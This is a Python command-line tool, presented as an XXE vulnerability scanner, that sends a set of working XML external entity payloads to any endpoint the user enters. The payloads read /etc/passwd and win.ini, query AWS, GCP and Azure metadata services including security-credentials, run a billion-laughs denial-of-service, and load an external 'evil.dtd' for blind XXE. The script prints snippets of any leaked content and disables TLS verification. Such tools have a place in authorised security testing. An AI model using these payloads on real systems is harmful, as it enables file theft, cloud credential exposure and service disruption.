import requests
import time
from colorama import init, Fore, Style

init(autoreset=True)


def run():
    print(f"\n{Fore.CYAN}{'=' * 70}")
    print(f"{Fore.CYAN}║{Fore.GREEN} ADVANCED XXE VULNERABILITY SCANNER {Fore.CYAN}║")
    print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")

    target = input(f"\n{Fore.YELLOW}Target XML endpoint (POST): {Style.RESET_ALL}").strip()
    if not target.startswith(("http://", "https://")):
        input()
        return

    headers_base = {
        "Content-Type": "application/xml",
        "Accept": "*/*"
    }

    payloads = [
        (
            '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>',
            "LFI Linux",
            ["root:x:", "daemon:x:", "bin:x:"]
        ),
        (
            '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///c:/windows/win.ini">]><x>&e;</x>',
            "LFI Windows",
            ["[extensions]", "[fonts]"]
        ),
        (
            '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "http://169.254.169.254/latest/meta-data/">]><x>&e;</x>',
            "AWS Metadata",
            ["ami-id", "instance-id", "security-credentials"]
        ),
        (
            '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><x>&e;</x>',
            "GCP Metadata",
            ["project", "instance", "attributes"]
        ),
        (
            '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "http://169.254.169.254/metadata/v1/">]><x>&e;</x>',
            "Azure Metadata",
            ["compute", "network", "platform"]
        ),
        (
            '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol1;</lolz>',
            "Billion Laughs DoS",
            []
        ),
        (
            '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % d SYSTEM "http://127.0.0.1:8000/evil.dtd">%d;]><x/>',
            "Blind XXE",
            []
        )
    ]

    session = requests.Session()
    session.verify = False
    vulnerable = False

    print(f"\n{Fore.CYAN}{'=' * 70}")
    print(f"{Fore.CYAN}XXE TEST RESULTS")
    print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")

    for payload, name, indicators in payloads:
        try:
            headers = dict(headers_base)
            if "169.254.169.254" in payload or "metadata.google.internal" in payload:
                headers["Metadata"] = "true"

            start = time.time()
            r = session.post(target, data=payload, headers=headers, timeout=12)
            elapsed = time.time() - start
            body = r.text.lower()

            if indicators and any(i.lower() in body for i in indicators):
                vulnerable = True
                sev = Fore.MAGENTA + Style.BRIGHT if "Metadata" in name else Fore.RED
                print(f"{sev}[!] XXE CONFIRMED: {name}{Style.RESET_ALL}")
                print(f"    Status: {r.status_code}")
                print(f"    Time: {elapsed:.2f}s")
                print(f"    Snippet: {r.text[:300].replace(chr(10),' ')[:300]}")
                break

            if not indicators and elapsed > 6:
                vulnerable = True
                print(f"{Fore.YELLOW}[!] POSSIBLE BLIND XXE / DoS VECTOR: {name}{Style.RESET_ALL}")
                print(f"    Response time anomaly: {elapsed:.2f}s")

            if r.status_code >= 500:
                print(f"{Fore.YELLOW}[?] Parser error with payload: {name}{Style.RESET_ALL}")

        except requests.exceptions.Timeout:
            print(f"{Fore.YELLOW}[?] Timeout on payload: {name}{Style.RESET_ALL}")
        except Exception:
            continue

    print(f"\n{Fore.CYAN}{'=' * 70}")
    print(f"{Fore.CYAN}RESULT")
    print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")

    if vulnerable:
        print(f"{Fore.MAGENTA}{Style.BRIGHT}[!] XXE VULNERABILITY DETECTED{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Risk: CRITICAL{Style.RESET_ALL}")
        print("• Arbitrary file read")
        print("• Cloud credential exposure")
        print("• SSRF via XML entities")
        print("• DoS via entity expansion")
    else:
        print(f"{Fore.GREEN}[✓] No XXE detected in tested vectors{Style.RESET_ALL}")

    print(f"\n{Fore.CYAN}{'=' * 70}")
    input()


if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()
    run()
